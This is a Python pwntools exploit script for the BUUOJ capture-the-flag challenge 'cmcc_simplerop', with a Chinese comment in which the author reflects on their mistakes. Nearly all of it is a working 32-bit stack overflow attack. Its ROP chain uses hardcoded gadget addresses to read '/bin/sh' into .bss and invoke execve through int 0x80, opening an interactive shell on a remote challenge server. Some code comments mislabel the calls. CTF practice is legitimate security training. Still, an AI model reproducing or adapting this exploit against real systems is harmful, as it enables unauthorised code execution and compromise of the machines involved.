from pwn import *

'''
    ROP is easy is'nt it ? 
    UNDO
        解题思路过于复杂，没有想到使用简单方式解决
        未提前预知read(0, &v4, 100);只能写入100字符，而ROPgadget ropchain产生rop链过长，导致get shell失败
        未完全理解read()，write()执行原理
    虽然通过查看答案修正思路解出题目, 不过还是判定不通过, 因此再buuoj未提交flag
'''


def cmcc_simplerop(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/cmcc_simplerop'):
    print('cmcc_simplerop start')
    context(log_level='debug', arch='i386', os='linux')
    target = process([file_name])
    target = remote('node4.buuoj.cn', 25866)
    target_elf = ELF(file_name)

    read_addr = p32(target_elf.symbols['read'])
    exit_addr = p32(target_elf.symbols['exit'])

    bin_sh_bss = p32(0x080EAF84)
    pop3_ret_gadget = p32(0x0806e828)  # pop esi ; pop ebx ; pop edx ; ret
    pop_eax_ret_gadget = p32(0x080bae06)  # pop eax ; ret
    pop_ecx_ebx_ret_gadget = p32(0x0806e851)  # pop ecx ; pop ebx ; ret
    pop_edx_ret_gadget = p32(0x0806e82a)  # pop edx ; ret
    int_80_gadget = p32(0x080493e1)  # int 0x80

    # eax = 0xB
    # ebx = "/bin/bash"
    # ecx = 0x0
    # edx = 0x0
    # int 0x80
    payload = b'a' * 32
    # write(1, bss_addr, 100);
    payload += read_addr + pop3_ret_gadget + p32(0x0) + bin_sh_bss + p32(0x10)
    # int_80(11,bss_addr,0,0)
    payload += pop_eax_ret_gadget + p32(0xb)
    payload += pop_ecx_ebx_ret_gadget + p32(0x0) + bin_sh_bss
    payload += pop_edx_ret_gadget + p32(0x0)
    payload += int_80_gadget
    payload += exit_addr

    target.sendlineafter('Your input :', payload)
    target.sendline(b'/bin/sh\x00')
    target.interactive()
    print('cmcc_simplerop end')


if __name__ == '__main__':
    cmcc_simplerop()
